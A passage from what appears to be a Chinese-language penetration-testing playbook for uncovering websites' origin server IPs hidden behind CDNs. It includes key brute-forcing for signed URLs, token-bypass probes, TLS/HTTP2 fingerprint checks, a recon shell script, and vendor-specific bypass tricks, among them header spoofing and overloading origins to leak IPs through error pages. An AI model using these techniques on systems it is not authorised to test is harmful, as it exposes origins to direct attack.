curl -s https://target.com/video.mp4 | grep -oP '(sign|auth|token|expires|signature)=[^&\s]+' | head -5

# === 2. 签名算法逆向 ===
# 场景: JS 中泄露了签名密钥
# 搜索: greb -r "sign" /js/ → 找到签名函数
# 场景: 签名算法简单（MD5(uri + key + expire)）
# 测试: 已知时间戳和签名，反推 key
python3 << 'PYEOF'
import hashlib
# 已知: sign=abc123&t=1719512345&uri=/video.mp4
# 尝试常见 key 字典
with open('keys.txt') as f:
    for key in f:
        key = key.strip()
        if hashlib.md5(f"/video.mp4{key}1719512345".encode()).hexdigest() == "abc123":
            print(f"Key found: {key}")
            break
PYEOF

# === 3. 签名时间窗口利用 ===
# 签名通常有有效期（如 1 小时）
# 在有效期内重放 Signed URL → 直接访问源站
# 若签名无 IP 绑定 → 可从任意 IP 访问源站
curl -H "Host: target.com" "https://源站IP/path?sign=xxx&t=xxx" -v

# === 4. Token 校验绕过 ===
# 部分 CDN 源站仅校验 Token 存在，不校验值
# 测试: 空 Token / 假 Token / 过期 Token
curl -H "Host: target.com" "https://源站IP/path?token="  -o /dev/null -w "%{http_code}\n"
curl -H "Host: target.com" "https://源站IP/path?token=test"  -o /dev/null -w "%{http_code}\n"
# 若 200 → 源站未正确校验 Token

# === 5. Nginx secure_link 爆破 ===
# 源站使用 nginx secure_link 模块
# 格式: MD5(expire + uri + secret)
# 若 expire 已知, 常用 secret 字典爆破
# 结果: 生成有效 signed URL → 直连源站
```

---

## 第二阶段补充：现代指纹验证体系（v5.0 新增，杜绝误报）

> 传统 Host 头返回 200 不足以确认源站：CDN 节点、共享主机、WAF 反向代理都会返回 200。
> v5.0 引入 JA3/JA4/HTTP2 三重指纹对比，达到"密码学级"确认。

### 验证总原则：四维指纹一致性

```
源站确认 = Host头响应 ✓ AND JA3/JA4指纹一致 ✓ AND HTTP/2指纹一致 ✓ AND 页面哈希一致 ✓
任一维度不符 → 可能是 CDN 节点/共享主机/蜜罐，降级处理
```

### 指纹 1：JA3 / JA4 TLS 客户端指纹（反向验证源站服务端栈）

```bash
# === JA3 是客户端 TLS Hello 指纹；JA4S 是服务端 Hello 指纹 ===
# 对比"经CDN访问"与"直连候选IP"的 JA4S（服务端指纹）
# 源站与 CDN 边缘的 TLS 栈配置不同 → JA4S 不同 → 区分源站

# 1. 获取经 CDN 的服务端指纹 (JA4S)
# 工具: ja4 (FoxIO-开源), fingerprintx
# 安装: go install github.com/foxio/ja4@latest
ja4 --tls-target target.com | grep "JA4S"
# 直连候选 IP（带正确 SNI）
ja4 --tls-target 候选IP --sni target.com | grep "JA4S"

# 2. 用 openssl 提取服务端 Hello 关键字段（无 ja4 工具时）
echo | openssl s_client -connect target.com:443 -servername target.com 2>/dev/null | \
  openssl s_client -connect target.com:443 -servername target.com 2>/dev/null
# 对比字段:
#   - Cipher Suite（密码套件顺序）
#   - TLS 版本
#   - Extensions 列表与顺序
#   - ALPN (h2/http1.1)
#   - Supported Groups (椭圆曲线)

# 3. Python 一键对比 (使用 pyja3 / ja4-python)
pip install ja4-python
python3 -c "
import ja4, subprocess
cdn = ja4.get_ja4s('target.com', sni='target.com')
direct = ja4.get_ja4s('候选IP', sni='target.com')
print(f'CDN  JA4S: {cdn}')
print(f'直连 JA4S: {direct}')
print('✓ 指纹一致 → 极可能是源站' if cdn==direct else '✗ 指纹不同 → 可能是 CDN 节点或不同栈')
"

# 4. 关键判定逻辑:
# - CDN 边缘通常启用广泛密码套件 + Brotli + HTTP/2/3
# - 源站通常密码套件较窄 + 可能仅 HTTP/1.1
# - 若直连 IP 的 JA4S = 经CDN的 JA4S → 极可能是 CDN 节点本身（非源站）
# - 若直连 IP 的 JA4S 与 CDN 不同，但证书链匹配 → 高度疑似源站
```

### 指纹 2：HTTP/2 Akamai 指纹（服务端 H2 SETTINGS 帧）

```bash
# === HTTP/2 指纹（Akamai 提出）===
# 由 SETTINGS 帧参数 + WINDOW_UPDATE + PRIORITY 组成
# 每个服务器软件（nginx/apache/envoy）配置不同 → 可区分 CDN 与源站

# 1. 使用 akamai/h2 fingerprint 工具
# go install github.com/RustMagro/akamai@latest  (或类似)
# 观察 H2 指纹字符串: "2:1:0:0:..." 类似格式

# 2. curl --http2 对比响应头差异
# 经 CDN:
curl -sI --http2 https://target.com | grep -iE "^server:|^via:|^x-cache:|^cf-ray:|^alt-svc:"
# 直连候选 IP:
curl -sIk --http2 -H "Host: target.com" --resolve target.com:443:候选IP https://target.com | grep -iE "^server:|^via:|^x-cache:|^cf-ray:|^alt-svc:"
# 关键: 直连响应不应出现 cf-ray/x-amz-cf-id 等 CDN 头 → 若出现说明仍是 CDN 节点

# 3. HTTP/2 帧序列对比 (Python hyper/h2 库)
pip install h2
python3 -c "
import socket, ssl, h2.connection, h2.config
def h2_fp(host, ip=None):
    sock = socket.create_connection((ip or host, 443), timeout=5)
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2'])
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ssock = ctx.wrap_socket(sock, server_hostname=host)
    cfg = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=cfg)
    conn.initiate_connection()
    ssock.sendall(conn.data_to_send())
    data = ssock.recv(65535)
    events = conn.receive_data(data)
    for e in events:
        print(repr(e))
h2_fp('target.com')           # 经 CDN
h2_fp('target.com', '候选IP')  # 直连
# 对比 SETTINGS max_concurrent_streams / initial_window_size / frame size
"

# 4. 判定: 源站的 H2 SETTINGS 与 CDN 不同（除非源站就是 CDN 节点）
#    若直连 IP 不支持 H2 (只回退 HTTP/1.1) → 强烈提示是源站（CDN 必支持 H2）
```

### 指纹 3：TCP/IP 指纹（OS 级，区分 CDN 边缘与源站）

```bash
# === TTL 与 TCP 窗口特征 ===
# CDN 边缘节点 OS 集中（Linux + 自定义栈），源站 OS 多样
# TTL 差异 + TCP Options 顺序 = p0f 指纹

# 1. TTL 对比（粗粒度）
ping -c 1 target.com | grep -oP 'ttl=\K[0-9]+'       # 经 CDN，通常 56-64 (Linux 边缘)
ping -c 1 候选IP | grep -oP 'ttl=\K[0-9]+'            # 直连源站，TTL 可能不同
# 注: TTL 受跳数影响，源站=CDN_TTL + 跳数差

# 2. p0f 被动指纹
# p0f -i any 'dst host 候选IP'
# 输出: OS 类别（Linux 3.x/Windows/Cisco 等）
# CDN 边缘通常是定制 Linux，源站可能 Windows/IIS 或其他

# 3. nmap OS 指纹
nmap -O -sS 候选IP | grep -iE "OS details|Running"
# 对比 CDN 节点的 nmap OS 结果

# 4. TCP Timestamp 选项差异
# 部分源站禁用 TCP TS 选项，CDN 边缘启用
# nmap -sS -O --osscan-guess 候选IP
```

### 指纹 4：证书钉刺 (Certificate Pinning) 绕过与源站确认

```bash
# === 当源站启用证书钉刺，仅信任特定证书 → 反向确认源站 ===
# 1. 提取源站证书 SPKI 哈希
echo | openssl s_client -connect target.com:443 -servername target.com 2>/dev/null | \
  openssl x509 -pubkey -noout | openssl pkey -pubin -outform der | openssl dgst -sha256 -binary | base64

# 2. 直连候选 IP，若证书链一致且通过钉刺验证 → 确认源站
echo | openssl s_client -connect 候选IP:443 -servername target.com 2>/dev/null | \
  openssl x509 -pubkey -noout | openssl pkey -pubin -outform der | openssl dgst -sha256 -binary | base64

# 3. 移动 App 中的钉刺配置泄露源站证书指纹
# 反编译 App 搜索: sha256/SPKI/pinning → 提取钉刺哈希
# 候选 IP 证书匹配该哈希 → 100% 确认源站
grep -rEo 'sha256/[^=]+=[A-Za-z0-9+/=]+' target_apk/
```

### 验证决策矩阵

| 直连响应特征 | 判定 | 下一步 |
|--------------|------|--------|
| 无 cf-ray/x-amz-cf-id + JA4S≠CDN + 无 H2 | **高置信源站** | 进入贝叶斯评分加权 |
| 有 cf-ray 但证书链一致 | **CDN 节点（误报）** | 排除该 IP |
| 无 CDN 头 + JA4S=CDN | **可能是 CDN 镜像/Anycast** | 查 ASN 排除 |
| TLS 握手失败/SNI 421 | **源站有 SNI 过滤** | 用正确 SNI 重试 + 方法31 |
| 返回 403 + Authenticated Origin Pulls | **Cloudflare 源站（已确认）** | 需客户端证书绕过 |
| 返回共享主机默认页 | **共享主机（非源站）** | 排除 |

---

## 第五阶段：贝叶斯加权置信度评分体系（v5.0 升级）

> v4.0 的简单累加评分存在缺陷：多个**强相关**证据（如 crt.sh 与 Censys 都查证书）会重复加分，导致虚高。
> v5.0 采用**贝叶斯后验 + 证据分组去相关**：将证据分为 6 个独立维度组，组内取最强证据，组间用对数似然比累乘。

### 证据分组与权重（对数似然比 LLR，单位 logit）

| 维度组 | 代表证据 | 命中 LLR (+) | 误报 LLR (-) | 说明 |
|--------|----------|-------------|-------------|------|
| A. 证书 | crt.sh/Censys/CA分析 | +3.0 | -1.0 | 组内取最大，不重复加 |
| B. DNS历史 | SecurityTrails/HackerTarget/OTX | +2.5 | -1.5 | 多源命中仅 +0.5 增益 |
| C. 子域名 | 枚举/AltDNS/泛解析过滤后 | +2.0 | -1.0 | 必须过滤泛解析 |
| D. 邮件 | SPF/MX/邮件头/Pingback | +2.0 | -0.5 | 邮件服务器常与Web分离 |
| E. 指纹验证 | Host头+JA4S+HTTP2+哈希 | +4.0 | -2.0 | 决定性证据，权重最高 |
| F. 空间引擎 | Shodan/FOFA/ZoomEye | +1.5 | -2.0 | 易误报（CDN节点入库） |

### 贝叶斯评分脚本（Python）

```python
#!/usr/bin/env python3
"""贝叶斯加权源站置信度评分 - v5.0
用法: python3 bayesian_score.py <ip> <target>
依赖文件: evidence_<ip>.json (各维度证据)
"""
import json, sys, math
from pathlib import Path

# 各维度对数似然比 (LLR)
LLR = {
    'A_cert':       {'hit': 3.0, 'miss': -1.0},
    'B_dns_history':{'hit': 2.5, 'miss': -1.5},
    'C_subdomain':  {'hit': 2.0, 'miss': -1.0},
    'D_mail':       {'hit': 2.0, 'miss': -0.5},
    'E_fingerprint':{'hit': 4.0, 'miss': -2.0},
    'F_space_engine':{'hit':1.5, 'miss': -2.0},
}
# 先验: 任意候选 IP 是源站的先验概率 0.2 (多数候选非源站)
PRIOR_LOGIT = math.log(0.2 / 0.8)

def score(ip, evidence):
    """
    evidence: dict, 形如 {'A_cert': True, 'B_dns_history': False, ...}
    组内多证据时取最强命中; 未命中则按 miss 扣分
    """
    logit = PRIOR_LOGIT
    details = []
    for dim, llr in LLR.items():
        hit = evidence.get(dim, False)
        delta = llr['hit'] if hit else llr['miss']
        logit += delta
        details.append(f"{dim}: {'HIT' if hit else 'miss'} ({delta:+.1f})")
    # logit → 概率
    prob = 1 / (1 + math.exp(-logit))
    return prob, details

def interpret(prob):
    if prob >= 0.95: return "几乎确定是源站 (P>95%)"
    if prob >= 0.80: return "高度疑似源站 (P 80-95%)"
    if prob >= 0.50: return "有可能 (P 50-80%)"
    if prob >= 0.20: return "可疑 (P 20-50%)"
    return "大概率误报 (P<20%)"

if __name__ == '__main__':
    ip, target = sys.argv[1], sys.argv[2]
    ev_file = Path(f"evidence_{ip.replace('.','_')}.json")
    evidence = json.loads(ev_file.read_text()) if ev_file.exists() else {}
    # 默认填充: 未提供的维度按 miss
    for dim in LLR:
        evidence.setdefault(dim, False)
    prob, details = score(ip, evidence)
    print(f"=== {ip} (target: {target}) ===")
    for d in details: print(f"  {d}")
    print(f"  后验概率 P(源站|证据) = {prob:.1%}")
    print(f"  判定: {interpret(prob)}")
    # 输出阈值建议
    print("  [≥0.95 可直接确认] [0.80-0.95 需补E指纹] [0.50-0.80 需多源补强] [<0.50 排除]")
```

### 决策树：按目标画像选择溯源路径（v5.0 新增）

```
开始 → 输入 target.com
  │
  ├─ 1. CDN 识别 (cf-ray/x-amz-cf-id/cn 域名?)
  │     ├─ 无 CDN → 直接 dig A, 结束
  │     └─ 有 CDN → 进入分支
  │
  ├─ 2. Cloudflare 专检 (cfargotunnel.com CNAME?)
  │     ├─ 是 Tunnel → 方法27 + 28(Pages/Workers) + 方法33(配置泄露) + 同账户兄弟域名
  │     └─ 否 → 进入 3
  │
  ├─ 3. 目标画像分支
  │     ├─【国内站点】ICP备案 → 天眼查资产 → 方法12(备案) + 方法34(OSS/COS桶)
  │     │            + 子域名(mail/ftp/cpanel 灰云) + 方法8(MX) + 方法7(SPF)
  │     ├─【AWS 架构】方法34(S3) + 方法29(Lambda@Edge) + CloudFront备用域名 + 方法22(回源IP)
  │     ├─【Serverless】方法28(Vercel/Netlify pages.dev) + 方法29 + 方法5(CNAME→*.vercel.app)
  │     ├─【容器/K8s】方法32(Ingress/Traefik dashboard) + Shodan ingress 指纹
  │     ├─【WordPress】方法13(Pingback) + 方法11(/feed) + 方法14(邮件头)
  │     └─【移动App】方法40(APK反编译) + Frida hook + 抓包
  │
  ├─ 4. 通用发现层 (所有目标必做)
  │     方法1(crt.sh) → 方法2(子域名) → 方法3(历史DNS) → 方法24(被动DNS聚合)
  │     → 方法4(Shodan/FOFA 证书搜索)
  │
  ├─ 5. 候选 IP 收集 + CDN 段过滤 (方法6)
  │
  ├─ 6. 四维指纹验证 (第二阶段补充)
  │     Host头 → JA4S → HTTP/2 → 页面哈希
  │     任一不符 → 降权
  │
  └─ 7. 贝叶斯评分 → P≥0.95 确认 / 否则回到 3 补强
```

### 快速判定表（评分速查）

| 命中维度组合 | 后验概率 | 行动 |
|--------------|----------|------|
| E(指纹)+A(证书) | 95%+ | 直接确认源站 |
| E+A+B | 99%+ | 铁证，记录归档 |
| A+B+C (无E) | 80-90% | 补做指纹验证 |
| 仅 F(空间引擎) | 30-50% | 高误报风险，必补 E |
| 仅 D(邮件) | 40-60% | 邮件服务器≠Web源站，谨慎 |
| E 单独 | 70-85% | 强证据，建议补 A 或 B |

---

## 第三阶段：增强验证（确保不误报）

### 多维度指纹对比

```bash
# 1. TLS 指纹对比（最关键）
# 对比密码套件
nmap --script ssl-enum-ciphers -p 443 target.com > cdn_tls.txt
nmap --script ssl-enum-ciphers -p 443 候选IP > direct_tls.txt
diff <(grep "TLS_" cdn_tls.txt | sort) <(grep "TLS_" direct_tls.txt | sort)

# 2. 证书完整对比
openssl s_client -connect target.com:443 -servername target.com </dev/null 2>/dev/null | openssl x509 -text -noout > cdn_cert.txt
openssl s_client -connect 候选IP:443 -servername target.com </dev/null 2>/dev/null | openssl x509 -text -noout > direct_cert.txt
# 关键对比字段: Serial Number, Fingerprint, Issuer, Validity, SAN

# 3. HTTP 响应头指纹
diff <(curl -sI https://target.com | sort) <(curl -sIk -H "Host: target.com" https://候选IP | sort)

# 4. 页面内容哈希（SHA256）
cdn_hash=$(curl -s https://target.com | sha256sum | cut -d' ' -f1)
direct_hash=$(curl -s -k -H "Host: target.com" https://候选IP | sha256sum | cut -d' ' -f1)
[ "$cdn_hash" = "$direct_hash" ] && echo "确认：内容完全一致，是源站！" || echo "内容不同，可能不是源站"

# 5. 确认 IP 不属于 CDN 范围
# 使用 kaeferjaeger.gay 的 CDN 范围数据或 whois 验证
```

---

## 第四阶段：快速组合拳（3 分钟最高成功率）

```bash
#!/bin/bash
# 快速溯源 - 3 分钟高成功率流程
TARGET=${1:?Usage: $0 target.com}

echo "[*] 快速溯源: $TARGET"
echo ""

# 步骤1: crt.sh 证书查询（30秒）
echo "[1/5] crt.sh 证书查询..."
IPS=$(curl -s "https://crt.sh/?q=${TARGET}&output=json" 2>/dev/null | jq -r '.[] | .name_value, .common_name' 2>/dev/null | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u)
echo "  发现 $(echo "$IPS" | wc -l) 个候选 IP"

# 步骤2: 子域名枚举（60秒）
echo "[2/5] 子域名枚举..."
for sub in mail ftp smtp pop3 imap webmail cpanel whm admin dev staging test direct origin backend vpn mysql ssh static img upload api m mobile; do
  ip=$(dig A "${sub}.${TARGET}" +short 2>/dev/null | grep -E '^[0-9]' | head -1)
  [ -n "$ip" ] && IPS="$IPS"$'\n'"$ip"
done
echo "  累计 $(echo "$IPS" | sort -u | wc -l) 个候选 IP"

# 步骤3: 历史 DNS（30秒）
echo "[3/5] 历史 DNS 查询..."
HIST_IPS=$(curl -s "https://api.hackertarget.com/hostsearch/?q=${TARGET}" 2>/dev/null | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}')
IPS="$IPS"$'\n'"$HIST_IPS"
echo "  累计 $(echo "$IPS" | sort -u | wc -l) 个候选 IP"

# 步骤4: SPF + MX（15秒）
echo "[4/5] SPF/MX 查询..."
IPS="$IPS"$'\n'$(dig TXT "$TARGET" +short | grep -oP 'ip4:\K[^\s]+')
IPS="$IPS"$'\n'$(dig MX "$TARGET" +short | awk '{print $NF}' | while read mx; do dig A "$mx" +short; done)

# 过滤内网IP和去重
IPS=$(echo "$IPS" | sort -u | grep -vE '^(0\.|127\.|10\.|172\.1[6-9]|172\.2[0-9]|172\.3[0-1]|192\.168\.)')

# 步骤5: 批量验证（60秒）
echo "[5/5] Host 头验证 $(echo "$IPS" | wc -l) 个候选..."
VERIFIED=""
for ip in $IPS; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -k -H "Host: $TARGET" "https://$ip" --connect-timeout 3 2>/dev/null)
  [ "$code" != "000" ] && VERIFIED="$VERIFIED"$'\n'"$ip → HTTP $code"
done

echo ""
echo "=== 结果 ==="
echo "$VERIFIED" | sort -u | grep -v '^$'
echo ""
echo "[*] 完成！对已验证 IP 进行 TLS 指纹对比确认源站"
```

---

## 各 CDN 厂商特定绕过技巧（完整版）

### Cloudflare — 12 种绕过手段

```bash
# === 1. DNS Only 灰云模式检测 ===
# Cloudflare DNS 面板中某些记录设为 "DNS Only"（灰色云）= 不经过 CDN 代理
# 高命中率灰云子域名
for sub in ftp mail smtp pop3 imap cpanel webmail direct origin mysql ssh whm autodiscover mx mta; do
  ip=$(dig A "${sub}.target.com" @8.8.8.8 +short | head -1)
  [ -n "$ip" ] && echo "${sub}.target.com → $ip"
done

# === 2. Cloudflare Origin CA 证书分析 ===
# 源站使用 Cloudflare Origin CA 证书时，证书 CN 可能暴露源站主机名
openssl s_client -connect target.com:443 -servername target.com </dev/null 2>/dev/null | openssl x509 -text -noout | grep -E "(Issuer:|Subject:)" -A3

# === 3. Cloudflare Workers 绕过 ===
# Workers 可能在 *.workers.dev 有直接暴露的子域名
# 检查目标是否使用 Workers 作为反向代理
# 如果 Workers 脚本有 bug，可能暴露源站 URL 在错误信息中

# === 4. Cloudflare Pages 绕过 ===
# *.pages.dev 域名可能直接指向源站
# 如果目标使用 Pages 部署，检查 pages.dev 子域名

# === 5. Argo Tunnel / Cloudflare Tunnel 探测 ===
# 如果使用 Argo Tunnel，所有流量通过加密隧道到 Cloudflare 边缘
# 传统溯源方法失效，此时重点关注：
# - Cloudflare Access 配置漏洞
# - cloudflared 客户端配置泄露
# - 隧道 endpoint 的 DNS 记录

# === 6. Cloudflare Cache Deception（缓存欺骗） ===
# 利用 Cloudflare 缓存规则将敏感页面缓存到 CDN 边缘
# 请求包含静态文件扩展名的路径可能绕过缓存规则
# curl https://target.com/admin.php/test.css → 可能被 Cloudflare 缓存

# === 7. Cloudflare Authenticated Origin Pulls 检测 ===
# 如果源站启用了 Authenticated Origin Pulls，需要客户端证书
# openssl s_client -connect 候选IP:443 -servername target.com 返回证书请求 → 确认源站

# === 8. CF-Connecting-IP 头伪造 ===
# Cloudflare 会将真实客户端 IP 放在 CF-Connecting-IP 头中
# 如果源站后端信任此头，可以伪造
curl -H "Host: target.com" -H "CF-Connecting-IP: 127.0.0.1" -k https://候选IP

# === 9. Cloudflare IP 列表更新获取 ===
# 及时获取最新 Cloudflare IP 段用于过滤
curl -s https://www.cloudflare.com/ips-v4/ | sort
curl -s https://www.cloudflare.com/ips-v6/ | sort

# === 10. Cloudflare 回源 IP 范围 ===
# 源站防火墙通常允许这些 IP 段访问
# 173.245.48.0/20, 103.21.244.0/22, 103.22.200.0/22, 103.31.4.0/22
# 141.101.64.0/18, 108.162.192.0/18, 190.93.240.0/20, 188.114.96.0/20
# 197.234.240.0/22, 198.41.128.0/17, 162.158.0.0/15, 104.16.0.0/13, 172.64.0.0/13

# === 11. Cloudflare Spectrum 绕过 ===
# Spectrum 用于代理非 HTTP 流量（SSH/RDP 等）
# 如果 Spectrum 配置了 TCP 端口转发，源站 IP 可能在 DNS 中

# === 12. Cloudflare 错误页面信息泄露 ===
# 触发 502/504 错误可能暴露源站信息
# 大量并发请求使源站超时 → Cloudflare 返回错误页面可能包含源站 IP
```

### AWS CloudFront — 8 种绕过手段

```bash
# === 1. S3 Bucket 源站直接访问 ===
# 如果 CloudFront 源站是 S3，直接访问 S3 域名
# 格式: http://target.s3.amazonaws.com
#       http://target.s3-website-us-east-1.amazonaws.com
#       http://target.s3.us-east-1.amazonaws.com

# === 2. ELB/ALB 源站 DNS 历史 ===
# 如果源站是 ELB/ALB，DNS 历史可能包含 ELB DNS 名称
# 格式: *.elb.amazonaws.com, *.elb.us-east-1.amazonaws.com

# === 3. EC2 源站公网 IP ===
# 如果源站是 EC2 实例有公网 IP，可能在历史 DNS 中
# 使用 SecurityTrails 查看完整 DNS 历史

# === 4. CloudFront Distribution 备用域名(CNAME) ===
# CloudFront Distribution 允许配置多个备用域名
# 其中某些域名可能未配置为通过 CDN 访问
# 通过 crt.sh 查看所有关联域名

# === 5. CloudFront 缓存行为配置 ===
# 某些路径可能设置为不缓存（直接回源）
# 尝试访问: /api/*, /admin/*, /wp-admin/*, /login*
# 这些路径的响应时间差异可能指示回源行为

# === 6. Lambda@Edge 泄露 ===
# Lambda@Edge 函数可能在错误日志中暴露源站信息
# 触发 Lambda@Edge 错误（如特殊请求头）

# === 7. CloudFront Signed URL/Cookie 绕过 ===
# 如果使用了 Signed URL 保护但配置不当
# 某些路径可能不需要签名就能直接访问

# === 8. CloudFront IP 范围更新 ===
curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | jq -r '.prefixes[] | select(.service=="CLOUDFRONT") | .ip_prefix'
```

### Akamai — 6 种绕过手段

```bash
# === 1. Edge Hostname 配置 ===
# 域名 CNAME 到 *.akamaiedge.net / *.edgekey.net / *.akamai.net
# 不同的 Edge Hostname 可能配置不同
# 直接访问 Edge Hostname 可能在某些地区绕过 CDN

# === 2. Akamai Origin Shield 绕过 ===
# Origin Shield 是 Akamai 的额外缓存层
# 如果 Origin Shield 配置了特定区域，其他区域可能直接回源

# === 3. Akamai Property Manager 配置泄露 ===
# 检查子域名是否在 Akamai Property 配置中遗漏
# 某些子域名可能未添加到 Akamai 配置中

# === 4. Akamai SureRoute 探测 ===
# SureRoute 用于优化回源路径
# 该功能可能暴露源站的网络拓扑信息

# === 5. Akamai GTM (Global Traffic Management) ===
# 如果使用 GTM 做 DNS 负载均衡，某些区域的 DNS 解析可能直接指向源站

# === 6. Akamai IP 范围 ===
# 常见 Akamai IP 段: 23.0.0.0/12, 104.64.0.0/10, 184.24.0.0/13
# 使用 whois 和 ASN 查询 (AS20940, AS16625) 获取完整范围
```

### Fastly — 5 种绕过手段

```bash
# === 1. Shield 节点配置 ===
# Fastly Shield 是指定的回源节点
# 如果 Shield 节点与源站在同一区域，连接可能不经 CDN 网络

# === 2. VCL 配置错误泄露 ===
# Fastly 使用 VCL (Varnish Configuration Language)
# 配置错误可能导致源站 IP 出现在响应头中
# curl -sI https://target.com | grep -iE "(x-served-by|x-cache|x-cache-hits|fastly)"

# === 3. Fastly 的 Health Check 暴露 ===
# Fastly 对源站做健康检查的请求可能带有特殊 User-Agent
# 如果源站日志泄露，可能暴露源站 IP

# === 4. Fastly 服务 ID 反查 ===
# 响应头中的 X-Served-By 包含 Fastly 服务 ID
# 通过服务 ID 可能关联到其他使用同一 Fastly 服务的域名

# === 5. Fastly IP 范围 ===
# 常见 Fastly IP 段: 151.101.0.0/16, 199.232.0.0/16, 146.75.0.0/16
# ASN: AS54113
```

### 阿里云 CDN — 9 种绕过手段

```bash
# === 1. 部分域名未配置 CDN ===
# 阿里云 CDN 需要手动添加域名，可能存在遗漏
# 检查: *.alicdn.com 子域名是否直接解析到源站

# === 2. OSS 源站直接访问 ===
# 如果源站是 OSS Bucket，直接访问 OSS 域名
# 格式: target.oss-cn-hangzhou.aliyuncs.com
#       target.oss-cn-beijing.aliyuncs.com
#       target.oss-cn-shanghai.aliyuncs.com
# 尝试所有地域: cn-hangzhou, cn-beijing, cn-shanghai, cn-shenzhen
#   cn-guangzhou, cn-chengdu, cn-hongkong, us-west-1, ap-southeast-1

# === 3. WAF 回源 IP 段 ===
# 阿里云 WAF 回源 IP 段: https://help.aliyun.com/document_detail/153857.html
# 如果同时使用 CDN+WAF，WAF 回源 IP 可能不同

# === 4. DCDN/全站加速 配置差异 ===
# 阿里云 DCDN（全站加速）和 CDN（静态加速）配置不同
# DCDN 可能对动态内容直接回源，通过特殊请求触发回源

# === 5. CDN 域名解析策略 ===
# 阿里云 CDN 的 CNAME 域名格式: target.com.w.kunlun*.com
# 不同地域解析到不同 CDN 节点
# 部分偏远地区可能解析到较少 CDN 覆盖的节点

# === 6. CDN 加速区域配置 ===
# 阿里云 CDN 可选择仅国内/仅海外/全球加速
# 如果仅国内加速，海外用户可能直接访问源站
# 使用海外 VPS 或代理进行 DNS 查询

# === 7. CDN 源站类型配置 ===
# 阿里云 CDN 支持: OSS域名 / IP / 源站域名
# 如果源站类型是"源站域名"，该域名可能直接暴露

# === 8. 阿里云 CDN IP 段 ===
# 47.96.0.0/13, 59.110.0.0/16, 120.52.0.0/15, 123.56.0.0/16
# 112.124.0.0/14, 114.215.0.0/16, 121.40.0.0/15, 182.92.0.0/16

# === 9. 阿里云 DDoS 高防 IP 回源 ===
# 如果同时使用 DDoS 高防，其回源 IP 段与 CDN 不同
# https://help.aliyun.com/document_detail/28407.html
```

### 腾讯云 CDN / EdgeOne — 8 种绕过手段

```bash
# === 1. 区域加速配置 ===
# 腾讯云 CDN 可选择"仅中国境内"或"全球"
# 如果仅中国境内，境外 DNS 解析可能直接到源站
dig A target.com @8.8.8.8 +short    # 境外解析
dig A target.com @119.29.29.29 +short  # 境内解析

# === 2. COS 源站直接访问 ===
# 如果源站是 COS Bucket
# 格式: target.cos.ap-guangzhou.myqcloud.com
# 尝试所有地域: ap-guangzhou, ap-shanghai, ap-beijing, ap-chengdu
#   ap-nanjing, ap-hongkong, ap-singapore, na-toronto, eu-frankfurt

# === 3. EdgeOne 配置差异 ===
# EdgeOne 是腾讯云新一代 CDN+边缘计算
# 响应头: X-NWS-LOG-UUID, EO-LOG-UUID, EO-Cache-Status
# EdgeOne 的源站配置可能与 CDN 不同

# === 4. 腾讯云 CDN 域名 CNAME 格式 ===
# target.com.cdn.dnsv1.com / target.com.dsa.dnsv1.com
# 直接解析 CNAME 域名查看后端 IP 配置

# === 5. CDN 缓存刷新接口泄露 ===
# 腾讯云 CDN 缓存刷新 API 可能需要指定 URL
# 如果能访问到刷新接口，可以推断源站 URL

# === 6. 腾讯云 CDN IP 段 ===
# 119.28.0.0/15, 162.62.0.0/16, 123.207.0.0/16
# 118.89.0.0/16, 193.112.0.0/16, 139.199.0.0/16

# === 7. 腾讯云 Anycast DNS 解析 ===
# EdgeOne 使用 Anycast IP，不同地区解析到同一 IP
# 与普通 CDN 的区别在于 Anycast IP 不随地区变化

# === 8. 腾讯云 CLB 源站 ===
# 如果源站是腾讯云 CLB，CLB 的 VIP 可能在 DNS 历史中
# 格式: *.clb.myqcloud.com
```

### 百度云加速 — 5 种绕过手段

```bash
# === 1. 百度云加速免费版限制 ===
# 免费版可能只代理部分子域名
# 检查: www.target.com 走 CDN 但其他子域名可能直连

# === 2. 百度云加速 SEO 配置 ===
# 百度云加速可能对搜索引擎爬虫设置特殊回源策略
# 伪造搜索引擎 UA 可能触发回源
curl -H "User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0)" https://target.com

# === 3. 百度云加速 IP 段 ===
# 180.76.0.0/16, 106.38.0.0/16, 153.99.0.0/16
# ASN: AS55967

# === 4. 百度云加速接入方式 ===
# 支持 NS 接入和 CNAME 接入
# NS 接入: DNS 由百度托管，可能包含内部 DNS 记录
# CNAME 接入: DNS 由用户自管，可通过 DNS 历史查询

# === 5. 百度云加速源站探测 ===
# 如果源站 IP 变更但百度云加速未更新
# 可能出现部分请求回源到旧 IP（通过 DNS 历史可找到）
```

### 又拍云 — 4 种绕过手段

```bash
# === 1. 又拍云 CNAME 分析 ===
# CNAME 格式: target.com.a.bdydns.com / target.com.b0.aicdn.com
# 直接解析 CNAME 可能暴露源站配置

# === 2. 又拍云存储源站 ===
# 如果源站是又拍云存储，可能通过存储域名直接访问
# 格式: target.b0.upaiyun.com

# === 3. 又拍云 IP 段 ===
# 106.42.0.0/16, 106.75.0.0/16, 114.55.0.0/16

# === 4. 又拍云 CDN 加速域名 ===
# 响应头: X-Upyun-*, X-Powered-By: UPYUN
# 又拍云支持自定义源站端口，可能暴露非标端口服务
```

### 七牛云 — 4 种绕过手段

```bash
# === 1. 七牛云融合 CDN ===
# 七牛云融合 CDN 整合了多家 CDN 厂商
# 不同厂商的 CDN 节点配置可能不同，利用配置差异溯源

# === 2. 七牛云存储源站 ===
# 如果源站是七牛云存储 Kodo
# 格式: target-src.qiniudn.com / target.xxx.clouddn.com

# === 3. 七牛云 IP 段 ===
# 115.231.0.0/16, 61.240.0.0/12, 58.83.0.0/16

# === 4. 七牛云 CDN 响应头 ===
# X-Qiniu-*, X-Reqid, X-Log, server: nginx/1.x
# 响应头中的 X-Reqid 可用于追踪请求
```

### 网宿 CDN — 4 种绕过手段

```bash
# === 1. 网宿 CDN 域名 CNAME ===
# CNAME 格式: target.com.xxx.wscdns.com / target.com.xxx.wangsu.com

# === 2. 网宿 CDN IP 段 ===
